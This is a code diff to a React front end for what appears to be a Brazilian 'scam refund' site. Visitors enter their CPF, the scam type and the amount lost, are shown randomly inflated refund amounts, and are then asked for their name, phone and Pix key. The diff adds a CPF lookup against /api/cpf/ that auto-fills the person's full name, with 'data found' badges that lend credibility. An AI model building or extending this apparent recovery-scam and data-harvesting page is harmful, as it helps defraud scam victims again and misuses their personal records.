@@ -98,6 +98,13 @@ function digitsToDisplay(digits) {
     return `R$ ${num.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
 }
 
+function toTitleCase(str) {
+    const small = ["da", "de", "do", "das", "dos", "e", "e"];
+    return str.toLowerCase().split(" ").map((w, i) =>
+        i === 0 || !small.includes(w) ? w.charAt(0).toUpperCase() + w.slice(1) : w
+    ).join(" ");
+}
+
 function generateAmounts(rawDigits) {
     const base = rawDigits ? parseInt(rawDigits, 10) / 100 : 500;
     const multiplier = 1.65 + Math.random() * 0.75;
@@ -181,7 +188,31 @@ function StepForm({ onSubmit, onClose }) {
     const [tipoGolpe, setTipoGolpe]     = useState("");
     const [valorDigits, setValorDigits] = useState("");
     const [suggestions, setSuggestions] = useState([]);
+    const [cpfData, setCpfData]         = useState(null);
+    const [cpfStatus, setCpfStatus]     = useState("idle"); // idle | loading | found | error
     const emailRef = useRef(null);
+
+    const cpfDigits = cpf.replace(/\D/g, "");
+
+    useEffect(() => {
+        if (cpfDigits.length !== 11) {
+            setCpfData(null);
+            setCpfStatus("idle");
+            return;
+        }
+        setCpfStatus("loading");
+        fetch(`/api/cpf/${cpfDigits}`)
+            .then((r) => r.json())
+            .then((data) => {
+                if (data?.NOME) {
+                    setCpfData(data);
+                    setCpfStatus("found");
+                } else {
+                    setCpfStatus("error");
+                }
+            })
+            .catch(() => setCpfStatus("error"));
+    }, [cpfDigits]);
 
     const handleEmailChange = (val) => {
         setEmail(val);
@@ -205,7 +236,7 @@ function StepForm({ onSubmit, onClose }) {
 
     const handleSubmit = (e) => {
         e.preventDefault();
-        onSubmit({ email, cpf, tipoGolpe, valorDigits });
+        onSubmit({ email, cpf, tipoGolpe, valorDigits, cpfData });
     };
 
     const inputStyle = { backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" };
@@ -274,8 +305,22 @@ function StepForm({ onSubmit, onClose }) {
                             required
                             inputMode="numeric"
                             className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
-                            style={inputStyle}
+                            style={{
+                                ...inputStyle,
+                                borderColor: cpfStatus === "found" ? "rgba(0,255,102,0.5)" : "#1e3a26",
+                            }}
                         />
+                        {cpfStatus === "loading" && (
+                            <p className="mt-1.5 text-[11px] text-zinc-500 flex items-center gap-1.5">
+                                <span className="w-2 h-2 rounded-full bg-zinc-500 animate-pulse inline-block" />
+                                Verificando CPF...
+                            </p>
+                        )}
+                        {cpfStatus === "found" && (
+                            <p className="mt-1.5 text-[11px] text-[#00FF66] flex items-center gap-1.5">
+                                ✓ Dados encontrados — campos serão preenchidos automaticamente
+                            </p>
+                        )}
                     </div>
 
                     <div>
@@ -532,7 +577,9 @@ function StepResults({ formData, onClose, onRegisterPix }) {
 // ─── step 4: pix key ──────────────────────────────────────────────────────────
 
 function StepPixKey({ formData, onSubmit, onBack }) {
-    const [nome, setNome]         = useState("");
+    const [nome, setNome]         = useState(
+        formData?.cpfData?.NOME ? toTitleCase(formData.cpfData.NOME) : ""
+    );
     const [telefone, setTelefone] = useState("");
     const [keyType, setKeyType]   = useState("CPF");
     const [keyValue, setKeyValue] = useState(formData?.cpf || "");
@@ -583,7 +630,14 @@ function StepPixKey({ formData, onSubmit, onBack }) {
             <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3">
                 <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                     <div>
-                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Nome completo</label>
+                        <div className="flex items-center justify-between mb-1.5">
+                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase">Nome completo</label>
+                            {formData?.cpfData?.NOME && (
+                                <span className="text-[9px] font-semibold text-[#00FF66] bg-[#00FF66]/10 border border-[#00FF66]/25 px-1.5 py-0.5 rounded-full">
+                                    ✓ Preenchido automaticamente
+                                </span>
+                            )}
+                        </div>
                         <input
                             type="text"
                             value={nome}
@@ -591,7 +645,10 @@ function StepPixKey({ formData, onSubmit, onBack }) {
                             placeholder="Seu nome completo"
                             required
                             className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
-                            style={inputStyle}
+                            style={{
+                                ...inputStyle,
+                                borderColor: formData?.cpfData?.NOME ? "rgba(0,255,102,0.35)" : "#1e3a26",
+                            }}
                         />
                     </div>
 
